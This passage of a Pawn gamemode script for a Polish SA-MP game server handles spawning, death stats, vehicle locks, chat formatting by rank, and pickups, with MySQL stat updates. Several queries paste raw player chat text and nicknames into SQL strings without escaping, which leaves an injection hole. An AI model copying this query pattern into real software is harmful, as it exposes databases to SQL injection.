    Streamer_UpdateEx(playerid, floatstr(X),floatstr(Y),floatstr(Z));
	SetPlayerPos(playerid, floatstr(X),floatstr(Y),floatstr(Z));
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
    GivePlayerMoney(playerid, 15000);
    GivePlayerWeapon(playerid, 9, 1);
    GivePlayerWeapon(playerid, 24, 100);
    GivePlayerWeapon(playerid, 26, 300);
    GivePlayerWeapon(playerid, 32, 1000);
    GivePlayerWeapon(playerid, 34, 20);
	if(GetPlayerMoney(playerid) <= 15000)
	{
	    if(Vip[playerid]) GivePlayerMoney(playerid, 20000);
	    else GivePlayerMoney(playerid, 30000);
	}
	if(Vip[playerid])
	{
   		SetPlayerArmour(playerid, 100.0);
	}
	if(Skin_User[playerid] > 0) SetPlayerSkin(playerid, Skin_User[playerid]);
	else Skin_User[playerid] = GetPlayerSkin(playerid);
	return 1;
}

public OnPlayerEnterDynamicArea(playerid, areaid)
{
	if(areaid == Ksiezyc_Zone)
	{
	}
	return 1;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	if(areaid == Ksiezyc_Zone)
	{
	}
	return 1;
}
forward DestroyDeathObject(objid);
public DestroyDeathObject(objid)
{
	DestroyObject(objid);
	return 1;
}

forward OnPlayerTeamPrivmsg( playerid, text[] );
public OnPlayerTeamPrivmsg( playerid, text[] )
{
        assert( AntiFlood_Check( playerid ) );
        return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    AntiDeAMX();
    assert( AntiFlood_Check( playerid ) );
    antifakekill[playerid] ++;
    SetTimerEx("antifakekill2", 1000,false,"i",playerid);
	pAntyTele[playerid][0] = -1;
    Spawned[playerid] = false;
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x,y,z);
	SetTimerEx("DestroyDeathObject", 4000, 0, "d", CreateObject(18681, x,y,z + 0.25, 0.0, 0.0, 0.0, 100.0));

	if(killerid != INVALID_PLAYER_ID)
	{
		if(Vip[killerid])
		{
		    GivePlayerScore(killerid, 2);
		    GameTextForPlayer(killerid,"respekt~n~~g~+2", 1000, 1);
		}
		else
		{
			GivePlayerScore(killerid, 1);
			GameTextForPlayer(killerid,"respekt~n~~g~+1", 1000, 1);
		}

		GivePlayerScore(playerid, -1);
		pAntyTele[killerid][0] = -1;

		GivePlayerMoney(killerid, floatround(GetPlayerMoney(playerid) / 2) + GetPVarInt(playerid, "hitman"));
		if(GetPVarInt(playerid, "hitman") > 0)
		{
		    format(strx, sizeof strx, ""czat" "C_O"Zosta³eœ nagrodzony za zabicie "C_B"%s! "C_O"Kwota: "C_B"%d$", pName[playerid], GetPVarInt(playerid, "hitman"));
		    SCM(killerid, -1, strx);
		}
	    SetPVarInt(playerid, "hitman",0);

		format(strx, sizeof strx, "UPDATE `players` SET `kills` = `kills` + 1 WHERE `nick` = '%s'", pName[killerid]);
		mysql_query(strx);


		if(IsPlayerInDM(killerid))
		{
			switch((GetPVarInt(killerid, "pDM") - 1))
			{
			    case 0: format(strx, sizeof strx, "UPDATE `players` SET `a_rpg` = `a_rpg` + 1 WHERE `nick` = '%s'", pName[killerid]), mysql_query(strx);
			    case 1: format(strx, sizeof strx, "UPDATE `players` SET `a_minigun` = `a_minigun` + 1 WHERE `nick` = '%s'", pName[killerid]), mysql_query(strx);
			    case 2: format(strx, sizeof strx, "UPDATE `players` SET `a_oneshoot` = `a_oneshoot` + 1 WHERE `nick` = '%s'", pName[killerid]), mysql_query(strx);
			    case 3: format(strx, sizeof strx, "UPDATE `players` SET `a_jetpack` = `a_jetpack` + 1 WHERE `nick` = '%s'", pName[killerid]), mysql_query(strx);
			    case 4: format(strx, sizeof strx, "UPDATE `players` SET `a_snajper` = `a_snajper` + 1 WHERE `nick` = '%s'", pName[killerid]), mysql_query(strx);
			}
		}

		/*if(!IsPlayerInAnyVehicle(playerid)
			&& IsPlayerInAnyVehicle(killerid)
			&& pInFun[playerid] == 0
			&& GetPlayerVirtualWorld(killerid) == 0
			&& GetPVarInt(playerid, "Wojskowy") == 0)
		{
			SetVehicleToRespawn(GetPlayerVehicleID(killerid));
			JailPlayer(killerid, "Valdrigar", ""C_O"Zabicie pieszego z pojazdu.");
		}*/
		if(GetPVarInt(playerid, "pJailed") == 1)
		{
			JailPlayer(killerid, "Valdrigar", ""C_O"Zabicie wiêŸnia");
		}

	}else if(Vip[playerid] == false)
	{
		GivePlayerScore(playerid, -1);
	}
    SetPVarInt(playerid, "explode", 0);
	SetPlayerMoney(playerid, 0);
	format(strx, sizeof strx, "UPDATE `players` SET `deads` = `deads` + 1 WHERE `nick` = '%s'", pName[playerid]);
	mysql_query(strx);

	SendDeathMessage(killerid, playerid, reason);
	//--
	if(GetPVarInt(playerid, "RacePlayer") == 1)
	{
		KillTimer(GetPVarInt(playerid, "RaceTimer"));
		ExitRace(playerid, 0);
	}

	if(GetPVarInt(playerid, "Walczy") == 1)
	{
		new i = GetPVarInt(playerid, "pWalka");
		if(i != -1)
		{
			pInFun[playerid] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			GivePlayerScore(playerid, (GetPVarInt(playerid, "pDExp") * -1 )+ 1);
	       	SetPVarInt(playerid, "pWalka", -1);
			SetPVarInt(playerid, "pDWeap1", 0);
			SetPVarInt(playerid, "pDWeap2", 0);
			SetPVarInt(playerid, "Walczy", 0);

			pInFun[i] = 0;
			SetPlayerVirtualWorld(i, 0);
			GivePlayerScore(i, GetPVarInt(playerid, "pDExp") - 2);
	       	SetPVarInt(i, "pWalka", -1);
			SetPVarInt(i, "pDWeap1", 0);
			SetPVarInt(i, "pDWeap2", 0);
			SetPVarInt(i, "Walczy", 0);
			SetPVarInt(i, "pDExp", 0);
			SetPVarInt(playerid, "pDExp", 0);
			ResetPlayerWeapons(i);
		    SetPlayerHealth(i, 100.0);
			Odstaw(i);
			SCM(i, 0xFFFFFFFF, ""czat" "C_O"Wygra³eœ "C_B"pojedynek!");
			SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Przegra³eœ "C_B"pojedynek!");

			format(strx, sizeof strx, "UPDATE `players` SET `winpvp` = `winpvp`+1 WHERE `nick` = '%s'", pName[i]);
			mysql_query(strx);
			format(strx, sizeof strx, "UPDATE `players` SET `lospvp` = `lospvp`+1 WHERE `nick` = '%s'", pName[playerid]);
			mysql_query(strx);
		}
	}
	if(GetPVarInt(playerid, "pZapisanyWG") == 1 && WG_Trwa)
	{
		WG_Team[GetPlayerTeam(playerid) - 10]--;
		SetPVarInt(playerid, "pZapisanyWG", 0);
		pInFun[playerid] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		if(WG_Team[GetPlayerTeam(playerid) - 10] <= 0)
		{
			KillTimer(WG_Timer);
			WG_End();
		}
		SetPlayerTeam(playerid, NO_TEAM);
	}else if(GetPVarInt(playerid, "pZapisanyCH") == 1 && CH_Trwa)
	{
		CH_Zapisanych--;
		pInFun[playerid] = 0;
		SetPVarInt(playerid, "pZapisanyCH", 0);
		SetPlayerVirtualWorld(playerid, 0);
		if(CH_Szukajacy == playerid && CH_Trwa == 1)
		{
		    KillTimer(CH_Timer);
		    CH_End();
		}
		if(CH_Zapisanych <= 1 && CH_Trwa == 1)
		{
		    KillTimer(CH_Timer);
		    CH_End();
		}
	}else if(GetPVarInt(playerid, "pZapisanyHay") == 1 && HAY_Trwa)
	{
		HAY_Zapisanych--;
		SetPlayerVirtualWorld(playerid, 0);
		SetPVarInt(playerid, "pZapisanyHay", 0);
		Iter_Remove(HAY_Array, playerid);
		pInFun[playerid] = 0;
		if(HAY_Zapisanych <= 1)
		{
		    KillTimer(HAY_Timer);
		    HAY_Trwa = 0;
			HAY_Timer = -1;
			HAY_Zapisanych = 0;
			HAY_Odliczanie = -1;
			Iter_Clear(HAY_Array);

			pLoop(i)
			{
			    if(IsPlayerConnected(i) == 1 && pInFun[i] == 1 && GetPVarInt(i, "pZapisanyHay"))
			    {
			        Odstaw(i);
					GivePlayerScore(i, 15);
					GivePlayerMoney(i, 15000);
			        pInFun[i] = 0;
			        SetPVarInt(i, "pZapisanyHay", 0);
					SCM(i, 0xFFFFFFFF, ""czat" Wygra³eœ "C_B"Hay! "C_O"Otrzymujesz "C_B"15 "C_O"exp i "C_B"15000$");
					break;
			    }
			}
			UpdateFunTextDraw();
		}
	}else if(GetPVarInt(playerid, "pZapisanySS") == 1 && SS_Trwa)
	{
		SS_Zapisanych--;
		SetPlayerVirtualWorld(playerid, 0);
		SetPVarInt(playerid, "pZapisanySS", 0);
		DisablePlayerCheckpoint(playerid);
		pInFun[playerid] = 0;
	}else if(GetPVarInt(playerid, "pZapisanyTW") == 1 && TW_Trwa)
	{
		TW_Zapisanych--;
		SetPlayerVirtualWorld(playerid, 0);
		SetPVarInt(playerid, "pZapisanyTW", 0);
		DisablePlayerCheckpoint(playerid);
		pInFun[playerid] = 0;
	}else if(GetPVarInt(playerid, "pZapisanyDD") == 1 && DD_Trwa)
	{
		DD_Zapisanych--;
		pInFun[playerid] = 0;
		SetPVarInt(playerid, "pZapisanyDD", 0);
		SetPlayerVirtualWorld(playerid, 0);
		if(DD_Zapisanych <= 1)
		{
		    KillTimer(DD_Timer);
		    DD_Trwa = 0;
			DD_Timer = -1;
			DD_Zapisanych = 0;
			DD_Odliczanie = -1;

			pLoop(i)
			{
			    if(IsPlayerConnected(i) == 1 && pInFun[i] == 1 && GetPVarInt(i, "pZapisanyDD"))
			    {
			        Odstaw(i);
					GivePlayerScore(i, 15);
					GivePlayerMoney(i, 15000);
			        pInFun[i] = 0;
			        SetPVarInt(i, "pZapisanyDD", 0);
					SCM(i, 0xFFFFFFFF, ""czat" Wygra³eœ "C_B"Derby! "C_O"Otrzymujesz "C_B"15 "C_O"exp i "C_B"15000$");
					break;
			    }
			}
			UpdateFunTextDraw();
		}
	}

	format(strx, sizeof strx, "Death: %s (%d) by ID: %d REASON: %d", pName[playerid], playerid, killerid, reason);
	WriteLog(strx);
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
    if(VehicleCreated[vehicleid] == 1)
	{
	    DestroyVehicle(vehicleid);
		VehicleCreated[vehicleid] = 0;
	}
    DestroyNeon(vehicleid);

   	vLock[vehicleid][0] = 0;
	vLock[vehicleid][1] = INVALID_PLAYER_ID;
	vLock[vehicleid][2] = 0;

	if(vObject[vehicleid][0] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][0]);
	    vObject[vehicleid][0] = -1;
	}
	if(vObject[vehicleid][1] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][1]);
	    vObject[vehicleid][1] = -1;
	}
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	DestroyNeon(vehicleid);
	if(vObject[vehicleid][0] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][0]);
	    vObject[vehicleid][0] = -1;
	}
	if(vObject[vehicleid][1] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][1]);
	    vObject[vehicleid][1] = -1;
	}
	return 1;
}
public OnPlayerText(playerid, text[])
{
    AntiDeAMX();
    new times[6];
	gettime(times[0], times[1], times[2]);
	getdate(times[3], times[4], times[5]);
	format(strx, 255, "INSERT INTO `czat_wiadomosci` SET `autor`='%s', `tresc`='%s', `data`='%d-%d-%d %d:%d:%d'", pName[playerid], text,
	times[3], times[4], times[5], times[0], times[1], times[2]);
	mysql_query(strx);
	if(pAFK[playerid] != 0)
	{
 		SCM(playerid, -1, ""czat" "C_O"Wpisz "C_B"/jj"C_O", aby aktywowaæ dzia³ania na serwerze.");
		return 0;
	}
    SetTimerEx("ResetCount", SpamLimit, false, "i", playerid);
	if(IsIP(text) == 1 || strfind(text, ".xaa.") != -1 || strfind(text, ".com") != -1 || strfind(text, ".com.pl") != -1 || strfind(text, ".pl") != -1 || strfind(text, ".eu") != -1 || strfind(text, ".wxv.pl") != -1 || strfind(text, ".cba.pl") != -1 || strfind(text, ".org") != -1 || strfind(text, ".eu") != -1)
	{
	    KickPlayer(playerid, "Ochrona" , "Reklama");
	    return 0;
	}

   	format(strx, sizeof strx, "%s (%d): %s", pName[playerid], playerid, text);
	WriteLog(strx);
    if(GetPVarInt(playerid, "Mucik") == 0)
	{
		SetPVarInt(playerid, "Wiadka", GetPVarInt(playerid, "Wiadka") + 1);
		SetTimerEx("Limit", 1500, 0, "i", playerid);

		if(GetPVarInt(playerid, "Wiadka") >= 4)
		{
			if(!(((GetPVarInt(playerid, "BladDziadygo") + 2) == 3)))
			{
				SCM(playerid, 0xD00000AA, "Nie spamuj!");
			}
			SetPVarInt(playerid, "BladDziadygo", GetPVarInt(playerid, "BladDziadygo") + 1);
		}
	}
	else
	{
		SCM(playerid, 0xD00000AA, "Jesteœ uciszony, nie mo¿esz pisaæ...");
		return 0;
	}
	if(Administrator[playerid] >= 1 && text[0] == '@')
	{
	    new str2[256];
    	strmid(str2,text,1,strlen(text));
		format(strx, sizeof strx, "[ADMIN-CHAT] %s:{11BB11} %s", pName[playerid], str2);
		foreach (Player, i)
		{
		    if(Administrator[i] == 0) continue;

			SCM(i, 0x11CC11FF, strx);
		}
		return 0;
	}


	if(GetPVarInt(playerid, "pJailed") == 1)
	{
	    SCM(playerid, 0xFFFFFFFF, "Jesteœ w wiêzieniu! Nie mo¿esz pisaæ!");
	    return 0;
	}
	if(GetPVarInt(playerid, "mute") > GetTickCount())
	{
	    format(strx, sizeof strx, ""czat" "C_O"Jesteœ uciszony. Bêdziesz móg³ pisaæ za "C_B"%d "C_O"sekund.", ((GetPVarInt(playerid, "mute") - GetTickCount()) / 1000));
		SCM(playerid, -1, strx);

	    format(strx, sizeof strx, "(MUTE:%d)"C_B": %s", playerid, text);
		pLoop(i)
		{
			if(Administrator[i]) SendPlayerMessageToPlayer(i,playerid, strx);
		}
		return 0;
	}
    if(strfind(text,"!kill",true) == 0) return Kick(playerid);
    if(strfind(text,"www.top.xaa.pl",true) == 0) return Kick(playerid);
 	if(TestReaction == 1 && !strcmp(STRReaction, text))
	{
		format(strx, sizeof strx, ""czat" "C_O"Gracz "C_B"%s "C_O"wpisa³ jako pierwszy poprawnie "C_B"%s", pName[playerid],STRReaction);
		SCMToAll(0xFFFFFFFF, strx);
		SCMToAll(0xFFFFFFFF, ""czat" "C_O"Wygra³ "C_B"15exp "C_O"oraz "C_B"5000$.");
		GivePlayerScore(playerid, 15);
		GivePlayerMoney(playerid, 5000);
		format(strx, sizeof strx, "UPDATE `players` SET `reaction` = `reaction` + 1 WHERE `nick` = '%s'", pName[playerid]);
		mysql_query(strx);
		ReactionTimeout();
		mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'reaction'");
	    return 0;
	}
    if(ObliczStatus == true)
	{
	    if((IsNumeric(text) || (text[0] == '-' && IsNumeric(text[1]))) && ObliczWynik == strval(text))
	    {
	        format(strx, sizeof(strx), ""C_O"Prawid³owy wynik "C_B"%d "C_O"jako pierwszy poda³ "C_B"%s"C_O". Otrzymuje "C_B"10.000$ i 35 exp'a.", ObliczWynik, pName[playerid]);
			SendClientMessageToAll(0xCC9966FF, strx);
			TextDrawHideForAll(Matematyka);
			GivePlayerMoney(playerid, 10000);
			GivePlayerScore(playerid, 35);
	        ObliczWynik = 0;
	        ObliczStatus = false;
	        format(strx, sizeof strx, "UPDATE `players` SET `mathematics` = `mathematics` + 1 WHERE `nick` = '%s'", pName[playerid]);
	    	mysql_query(strx);
	        mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'mathematics'");
	        return 0;
	    }
	}
    switch(Administrator[playerid])
	{
		case 1:
		{
		    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{a00a09}J-Admin{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
			SCMToAll(0x4A4A4AFF, chattext);
			return 0;
		}
		case 2:
		{
		    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{a00a09}Admin{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
			SCMToAll(0x4A4A4AFF, chattext);
			return 0;
		}
		case 3:
		{
		    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{a00a09}Vice-Head{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
			SCMToAll(0x4A4A4AFF, chattext);
			return 0;
		}
		case 4:
		{
		    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{a00a09}Head-Admin{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
			SCMToAll(0x4A4A4AFF, chattext);
			return 0;
		}
	}
    if(Vip[playerid])
	{
	    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{67b41e}VIP{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
		SCMToAll(0x4A4A4AFF, chattext);
		return 0;
	}
	if(GetPlayerScore(playerid) <= 1000)
	{
	    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{b5ae9d}Nowy{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
		SCMToAll(0x4A4A4AFF, chattext);
		return 0;
	}
	if(GetPlayerScore(playerid) >= 50000)
	{
	    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{00B7B7}Sta³y-Gracz{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
		SCMToAll(0x4A4A4AFF, chattext);
		return 0;
	}
	if(GetPlayerScore(playerid) >= 20000)
	{
	    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{FF9B37}Bywalec{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
		SCMToAll(0x4A4A4AFF, chattext);
		return 0;
	}

	/*new string[128];
	if(PlayerInfo[playerid][Gang])
	{
		format(string, sizeof(string), "[%s] %s ( %d ) : %s", GetGangName(PlayerInfo[playerid][Gang]), pName[playerid], playerid, text);
		SendClientMessageToAll(GetPlayerColor(playerid), string);
		return 0;
	}*/

    format(chattext, sizeof(chattext), "›› %d {%06x}%s{FFFFFF} |{b5ae9d}Gracz{FFFFFF}| %s", playerid, (GetPlayerColor(playerid) >>> 8), pName[playerid], text);
	SCMToAll(0x4A4A4AFF, chattext);
	return 0;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(vLock[vehicleid][0] == 1 && vLock[vehicleid][1] != playerid)
	{
		if(IsPlayerInVehicle(vLock[vehicleid][1], vehicleid) || vLock[vehicleid][2] > GetTickCount() && IsPlayerConnected(vLock[vehicleid][1]))
		{
		    InfoBox(playerid,  ""C_O"Ten "C_B"pojazd "C_O"jest zamkniety!");
		    ClearAnimations(playerid);
		    return 1;
		}
	}
	if(ispassenger != 0)
	{
		new isdriver;
	    pLoop(i)
	    {
		   if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
		   {
				isdriver = 1;
				break;
			}
		}
		if(!isdriver)
		{
		    SetPlayerArmedWeapon(playerid,0);
		}
	}
    if(PrivCar[vehicleid] >= 0 && PrivCar[vehicleid] != playerid && !ispassenger)
    {
       new Float:cpos[3];
       GetPlayerPos(playerid, cpos[0], cpos[1], cpos[2]);
       SetPlayerPos(playerid, cpos[0], cpos[1], cpos[2]);
       new string2[888];
       format(string2, sizeof(string2), ""C_O"To prywatny pojazd Gracza "C_B"%s"C_O"!", pName[PrivCar[vehicleid]]);
       SendClientMessage(playerid, -1, string2);
    }
	return 1;
}

tostr(int)
{
	new st[256];
	format(st, 256, "%d", int);
	return st;
}

floatval(Float:val)
{
	new str[256];
	format(str, 256, "%.0f", val);
	return todec(str);
}

todec(str[])
{
	return strval(str);
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
	new engine,lights,doors,bonnet,alarm,boot,objective;
	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehicleid,engine,lights,0,doors,bonnet,boot,objective);

	TD_Hide(playerid, LicznikBox);
    TD_Hide(playerid, Stan[0][playerid]);
	TD_Hide(playerid, Stan[1][playerid]);

	if(vLock[vehicleid][0] == 1)
	{
	    vLock[vehicleid][2] = GetTickCount() + 20000;
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
    	pLoop(i)
    	{
		   if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) != PLAYER_STATE_DRIVER)
		   {
				SetPlayerArmedWeapon(playerid,0);
				break;
			}
		}
	}
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		new model = GetVehicleModel(GetPlayerVehicleID(playerid));
		switch(model)
		{
		    case 462,448,581,522,461,521,523,463,586,468,471:{
				new rand = random(4);
				if(rand == 0) SetPlayerAttachedObject(playerid,0,18645,2,0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000);
				else if(rand == 1) SetPlayerAttachedObject(playerid,0,18977,2,0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000);
				else if(rand == 2) SetPlayerAttachedObject(playerid,0,18978,2,0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000);
				else if(rand == 3) SetPlayerAttachedObject(playerid,0,18979,2,0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000);
			}
		}
	}
	else if(oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER)
	{
	    RemovePlayerAttachedObject(playerid, 0);
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
		pVehicle[playerid] = GetPlayerVehicleID(playerid);
	    TD_Show(playerid, Stan[0][playerid]);
	    TD_Show(playerid, Stan[1][playerid]);
        TD_Show(playerid, LicznikBox);

	    SetTimerEx("HideNameVehicle", 3000, 0, "d", playerid);
	    TD_Show(playerid, Stan[0][playerid]);
	    TD_Show(playerid, Stan[1][playerid]);
        new namescars[300];
        format(namescars, sizeof(namescars), "(Pojazd):~r~/%s", GetVehicleName(GetVehicleModel(pVehicle[playerid])));
        TextDrawSetString(TD_Pojazd, namescars);
        TD_Show(playerid, TD_Pojazd);
        SetTimerEx("TD_Pojazd_Hide", 4000, 0, "d", playerid);
		new Float:hp;
		GetVehicleHealth(pVehicle[playerid], hp);
		if(hp == 1000.0 && Vip[playerid])
		{
		    SetVehicleHealth(pVehicle[playerid], 1150.0);
		}

		pLoop(i)
		{
			if(GetPlayerState(i) == PLAYER_STATE_SPECTATING && SpecPlayer[i] == playerid)
			{
				TogglePlayerSpectating(i, 1);
				PlayerSpectateVehicle(i, pVehicle[playerid]);
			}
		}

	}else if(oldstate == PLAYER_STATE_DRIVER)
	{
        TD_Hide(playerid, LicznikBox);
	    TD_Hide(playerid, Stan[0][playerid]);
	    TD_Hide(playerid, Stan[1][playerid]);

		new Float:hp;
		GetVehicleHealth(pVehicle[playerid], hp);
		if(hp > 1000.0)
		{
		    SetVehicleHealth(pVehicle[playerid], 1000.0);
		}

		pLoop(i)
		{
			if(GetPlayerState(i) == PLAYER_STATE_SPECTATING && SpecPlayer[i] == playerid)
			{
				TogglePlayerSpectating(i, 1);
				PlayerSpectatePlayer(i, playerid);
			}
		}

		vLock[pVehicle[playerid]][2] = GetTickCount() + 20000;
	}
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
    StopAudioStreamForPlayer(playerid);
    Skin_User[playerid] = GetPlayerSkin(playerid);
	if(Ananas == 1)
	{
	    new pfu;
	    while(pfu != 2)
	    {
	        pfu += 3;
	    }
	}
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(pAFK[playerid] != 0)
	{
 		SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Wpisz "C_B"/jj"C_O", aby aktywowaæ dzia³ania na serwerze.");
		return 0;
	}

	if(pickupid == PickupBan)
	{
	    BanPlayer(playerid, "Anty Cheat", "Pickup Hack");
	    return 0;
	}

	if(pickupid == gunshop_lv_outside)
	{
        SetPlayerVirtualWorld(playerid, 0);
        SetPlayerPos(playerid,286.800995,-82.547600,1001.539978);
        SetPlayerInterior(playerid, 4);
        return 1;
	}

	if(pickupid == gunshop_lv_inside)
	{
	    SetPlayerVirtualWorld(playerid, 0);
	    SetPlayerPos(playerid, 2178.4507, 966.4485, 10.8203);
	    SetPlayerInterior(playerid, 0);
	    return 1;
	}

	if(pickupid == PicSzkola[0]) return SetPlayerPos(playerid, -1504.7135,936.8499,-40.9796);
	if(pickupid == PicSzkola[1]) return SetPlayerPos(playerid, -1495.6118,919.9480,7.1875);
	if(pickupid == PicSzkola[2]) return SetPlayerPos(playerid, -1532.3051,853.3191,-38.8357);
	if(pickupid == PicSzkola[3]) return SetPlayerPos(playerid, -1534.1536,821.6552,-37.8085);
	if(pickupid == PicSzkola[4]) return SetPlayerPos(playerid, -1513.0636,928.7078,-40.9796);
	if(pickupid == PicSzkola[5]) return SetPlayerPos(playerid, -1513.6208,935.7849,-40.9796);

    if(pickupid == WojskoSklep) if(GetPVarInt(playerid, "Wojskowy") == 1) return ShowPlayerDialog(playerid, 345, DIALOG_STYLE_LIST, "Sklep wojskowy", "Minigun 2500000 $ \nWyrzutnia 2000000 $ \nWyrzutnia2 2000000 $ \nMiotacz ognia 1500000 $ \nGranaty 500000 $ \nKoktajl Motolova 500000 $ \nNiewidzialnoœæ 15000 $ \n ", "Kup", "Zamknij");

	if(pickupid == pickupAmmu[0] || pickupid == pickupAmmu[1] || pickupAmmu[2] == pickupid || pickupAmmu[3] == pickupid )
	{
		if(GetPVarInt(playerid, "pEnterPick") != 1)
		{
    		cmd_bronie(playerid,  " ");
			SetPVarInt(playerid, "pEnterPick", 1);
		}
		return 1;
	}
	if(pickupid == sklep_lv)
	{
    	cmd_bronie(playerid,  " ");
		return 1;
	}
	if(pickupid == pickupEat[0] || pickupid == pickupEat[1] || pickupid == pickupEat[2] || pickupid == pickupEat[3])
	{
		if(GetPVarInt(playerid, "pEnterPick") != 1)
		{
		   	Dialog(playerid, 21, DIALOG_LIST, ""C_O"Snikers "C_B"[100$ | 10hp]\n"C_O"Chipsy "C_B"[250$ | 25hp]\n"C_O"Hamburger "C_B"[500$ | 50hp]\n"C_O"FRUGO! "C_B"[1000$ | 100hp]","Kup", "Zamknij");
			SetPVarInt(playerid, "pEnterPick", 1);
		}
		return 1;
 	}
	if(walizka[1] == pickupid && walizka[2] == 1 && walizka[0] != playerid)
	{
	    DestroyPickup(walizka[1]);
	    walizka[0] = -1;
		walizka[2] = 0;
		walizka[1] = -1;
		TextDrawHideForAll(WalizkaDraw[0]);
		TextDrawHideForAll(WalizkaDraw[1]);
		WalizkaWin(playerid);
	    return 1;
	}

	if(Administrator[playerid] < 1)
	{
		for(new i; i < MAX_FIGUREK; i++)
		{
			if(Figurki_PICKUP[i] == pickupid)
			{
				DestroyPickup(Figurki_PICKUP[i]);
				Figurki_PICKUP[i] = -1;
	   			format(strx, sizeof strx, "DELETE FROM `figurki` WHERE `id` = '%d'", Figurki_ID[i]);
				mysql_query(strx);
				format(strx, sizeof strx, "UPDATE `players` SET `figurki` = `figurki` + 1 WHERE `nick` = '%s'", pName[playerid]);
				mysql_query(strx);
				Figurki_ID[i] = -1;

				GivePlayerScore(playerid, FIGURKI_PUNKTY);
				GivePlayerMoney(playerid, FIGURKI_KASA);
				format(strx, sizeof strx, ""czat" "C_O"Gracz "C_B"%s "C_O"znalaz³ figurkê i wygra³ "C_B"%dexp "C_O"+ "C_B"%d$!!!", pName[playerid], FIGURKI_PUNKTY, FIGURKI_KASA);
				SCMToAll(0xFFFFFFFF, strx);

				mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'figurka'");
				return 1;
			}
		}
	}
	if(HousePic[0] == pickupid	|| HousePic[1] == pickupid
		|| HousePic[2] == pickupid	|| HousePic[3] == pickupid
		|| HousePic[4] == pickupid	|| HousePic[5] == pickupid)
	{
	    ExitHousePlayer(playerid, GetPVarInt(playerid, "eHouseID"));
	    return 1;
	}

	for(new i; i < MAX_HOUSES; i++)
	{
	    if(pickupid == HouseInfo[i][hCP])
	    {
			if(!strcmp(HouseInfo[i][hOwner], "#"))
			{
				SetPVarInt(playerid, "eHouseID", i);
			    new mstr[120];
			    format(mstr, 120, "\n"C_O"Chcesz kupiæ ten dom za "C_B"%d$?\n", HouseInfo[i][hCost]);
			    Dialog(playerid, 800, DIALOG_BOX, mstr, "TAK", "NIE");
			}else if(!strcmp(HouseInfo[i][hOwner], pName[playerid]) && strlen(HouseInfo[i][hOwner]) != 0)
			{
            TeleportToHouse(playerid, i, 1);
			}else{
			    new mstr[120];
			    format(mstr, 120, "\n"C_O"W³aœcicielem tego domu jest "C_B"%s.\n"C_O"Bez jego zaproszenia nie mo¿esz wejœæ do domu.\n", HouseInfo[i][hOwner]);
				InfoBox(playerid, mstr);
			}
			return 1;
		}
	}
	SetPVarInt(playerid, "eHouseID", -1);
	if(propPickups[pickupid] != -1)
	{
		if((GetTickCount() - pPropertyPickup[playerid]) < 3000) return 0;

		new id = propPickups[pickupid], Float:x, Float:y, Float:z;
		GetPropertyEntrance(id, x, y, z);

		if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z ))
		{
			PutPlayerInProperty(playerid, id, 1);
			SCM(playerid, 0xFFFFFFFF, ""czat" "C_O"Wszed³eœ do budynku.. wpisz "C_B"/exit "C_O"aby wyjœæ" );
		}
		return 1;
	}
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	if(newinteriorid == 0
		&& currentInt[playerid] > -1
